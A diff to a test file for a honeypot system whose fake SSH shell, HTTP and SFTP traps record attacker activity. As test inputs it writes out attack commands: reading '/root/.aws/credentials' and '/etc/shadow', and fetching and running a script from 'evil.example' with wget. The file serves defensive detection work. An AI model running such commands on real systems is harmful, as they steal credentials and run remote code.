@@ -127,10 +127,9 @@ def test_ssh_trap_captures_credentials_commands_honeytoken(tmp_path):
         await trap.stop()
         evs = buf.peek(50)
         assert ("root", "hunter2") in [(e["username"], e["password"]) for e in evs if e["type"] == "auth_attempt"]
+        assert [e["command"] for e in evs if e["type"] == "command"][:1] == ["cat /root/.aws/credentials"]
         assert any(e["type"] == "honeytoken" and e["command"] == "/root/.aws/credentials" for e in evs)
         assert "session_end" in types(buf) and len({e["session_id"] for e in evs if e["session_id"]}) == 1
-        connect_evs = [e for e in evs if e["type"] == "connect"]
-        assert connect_evs and "client_version" in connect_evs[0].get("data", {})
         # стабильный отпечаток: ключ хоста сохранён и переиспользуется
         again = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
         assert again._host_key().export_public_key() == trap._host_key().export_public_key()
@@ -299,6 +298,12 @@ def test_agent_starts_traps_from_manifest(tmp_path):
         center.close()
 
 
+def test_client_falls_back_to_plain_channel_without_cryptography(monkeypatch):
+    from netsvc import center
+
+    monkeypatch.setattr(center, "derive_payload_key", None)
+    c = center.CenterClient("http://x", "hf_token")
+    assert c.key is None and c.encrypt is False
 def test_low_trap_interactive_redis_and_ftp():
     async def go():
         buf = EventBuffer(":memory:")
@@ -402,4 +407,105 @@ def test_http_trap_builtin_honeytokens_and_probes():
         assert any(e["type"] == "honeytoken" and e["command"] == "/.env" for e in evs)
         assert any(e["type"] == "honeytoken" and e["command"] == "/.git/config" for e in evs)
         assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "web-attack-probe" for e in evs)
+
+    run(go())
+
+
+# --- поддельная оболочка ---
+def make_shell(user="root", tty=False):
+    from netsvc.traps import shell as sh
+    sh.NET_DELAY = (0, 0)
+    fs = sh.FakeFS("web-prod-01", [{"type": "file", "path": "/root/.aws/credentials", "content": "AKIAFAKE\n"}],
+                   'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nVERSION_ID="22.04"\n')
+    events = []
+    uname = "Linux {hostname} 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux"
+    return sh.Shell(fs, user, "web-prod-01", fs.files["/etc/os-release"], uname, 0, "10.20.0.15", [(22, "ssh"), (80, "http")],
+                    "1.2.3.4", lambda kind, **kw: events.append((kind, kw)), tty=tty), events
+
+
+def sh_run(shell, line):
+    return run(shell.run_line(line))[0]
+
+
+def test_shell_chains_pipes_quotes_and_variables():
+    shell, _ = make_shell()
+    assert sh_run(shell, "id; hostname") == "uid=0(root) gid=0(root) groups=0(root)\nweb-prod-01\n"
+    assert sh_run(shell, "false && echo no || echo yes") == "yes\n"
+    assert sh_run(shell, "echo 'a  b' \"c $USER\"") == "a  b c root\n"
+    assert sh_run(shell, "cat /etc/passwd | grep www | wc -l") == "1\n"
+    assert sh_run(shell, "echo $(hostname)-x `whoami`") == "web-prod-01-x root\n"
+    assert sh_run(shell, "X=5; echo $X ${X}") == "5 5\n"
+    assert sh_run(shell, "echo aGk= | base64 -d") == "hi"
+    assert sh_run(shell, "echo $(echo id) | sh") == "uid=0(root) gid=0(root) groups=0(root)\n"
+    assert sh_run(shell, "echo 'unclosed").startswith("bash: unexpected EOF")
+
+
+def test_shell_filesystem_state_redirects_and_permissions():
+    shell, events = make_shell()
+    assert sh_run(shell, "mkdir /tmp/x && cd /tmp/x && echo hello > f.txt && cat f.txt && ls") == "hello\nf.txt\n"
+    assert sh_run(shell, "ls /tmp/x /nonexist").endswith("ls: cannot access '/nonexist': No such file or directory\n")
+    assert sh_run(shell, "echo a >> f.txt; wc -l < f.txt") == "2\n"
+    assert sh_run(shell, "rm -rf /tmp/x; ls /tmp") == ""
+    assert sh_run(shell, "cat /root/.aws/credentials") == "AKIAFAKE\n"
+    assert any(k == "honeytoken" for k, _ in events)
+    wrote = [kw["data"] for k, kw in events if k == "payload" and kw["data"].get("kind") == "write"]
+    assert wrote and wrote[0]["sha256"] == __import__("hashlib").sha256(b"hello\n").hexdigest() and wrote[0]["size"] == 6
+    user, _ = make_shell("admin")
+    assert sh_run(user, "cat /etc/shadow") == "cat: /etc/shadow: Permission denied\n"
+    assert "root:" in sh_run(user, "sudo cat /etc/shadow")
+    assert sh_run(user, "pwd") == "/home/admin\n" and user.prompt() == "admin@web-prod-01:~$ "
+    assert sh_run(user, "cd /var/www && pwd") == "/var/www\n"
+
+
+def test_shell_system_info_is_consistent_and_downloads_logged():
+    shell, events = make_shell()
+    assert sh_run(shell, "uname -r") == "5.15.0-122-generic\n"
+    assert "22.04" in sh_run(shell, "lsb_release -a") and "Ubuntu 22.04.4 LTS" in sh_run(shell, "cat /etc/os-release")
+    assert ":80 " in sh_run(shell, "ss -tlnp") and "apache2" in sh_run(shell, "ps aux")
+    assert "systemd-journal-helper" not in sh_run(shell, "ps aux; ps -ef")
+    out = sh_run(shell, "cd /tmp && wget http://evil.example/x.sh && chmod +x x.sh && ./x.sh && ls")
+    assert "saved [" in out and out.endswith("x.sh\n")
+    assert any(k == "payload" and "evil.example" in kw["command"] for k, kw in events)
+    assert any(k == "payload" and kw["data"]["kind"] == "execution-attempt" for k, kw in events)
+    assert sh_run(shell, "cd /tmp && touch y && ./y") == "bash: ./y: Permission denied\n"
+    assert sh_run(shell, "nosuch --flag") == "bash: nosuch: command not found\n"
+    assert sh_run(shell, "exit") == "" and not shell.alive
+
+
+def test_http_trap_apache_style_errors_and_head():
+    async def go():
+        trap = HttpTrap({"port": 0}, {}, Emitter(EventBuffer(":memory:")))
+        await trap.start("127.0.0.1")
+        miss = (await http(trap.port, b"GET /nope HTTP/1.1\r\nHost: shop.example.com\r\nConnection: close\r\n\r\n")).decode()
+        assert "Date: " in miss and "Apache/2.4.41 (Ubuntu) Server at shop.example.com Port" in miss
+        assert b"403 Forbidden" in await http(trap.port, b"GET /server-status HTTP/1.1\r\nHost: a\r\n\r\n")
+        assert b"501 Not Implemented" in await http(trap.port, b"FOO / HTTP/1.1\r\nHost: a\r\n\r\n")
+        head = await http(trap.port, b"HEAD / HTTP/1.1\r\nHost: a\r\n\r\n")
+        assert head.startswith(b"HTTP/1.1 200") and b"<form" not in head
+        await trap.stop()
+    run(go())
+
+
+def test_sftp_upload_is_captured_hashed_and_removed(tmp_path):
+    import base64
+    import hashlib
+
+    async def go():
+        buf = EventBuffer(":memory:")
+        trap = SshTrap({"port": 0}, {"decoys": {"hostname": "web-1"}}, Emitter(buf), str(tmp_path))
+        await trap.start("127.0.0.1")
+        src = tmp_path / "payload.sh"
+        src.write_bytes(b"#!/bin/sh\necho hi\n")
+        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="x", known_hosts=None) as conn:
+            async with conn.start_sftp_client() as sftp:
+                await sftp.put(str(src), "/tmp/up.sh")
+        await asyncio.sleep(0.3)
+        await trap.stop()
+        ups = [e for e in buf.peek(50) if e["type"] == "payload" and e["data"].get("kind") == "upload"]
+        assert len(ups) == 1
+        d = ups[0]["data"]
+        assert d["sha256"] == hashlib.sha256(src.read_bytes()).hexdigest() and d["size"] == 18
+        assert base64.b64decode(d["content_b64"]) == src.read_bytes()
+        assert "/tmp/up.sh" in trap.fs.files
+        assert not [p for p in tmp_path.iterdir() if p.name.startswith("sftp-")]  # временная папка убрана
     run(go())
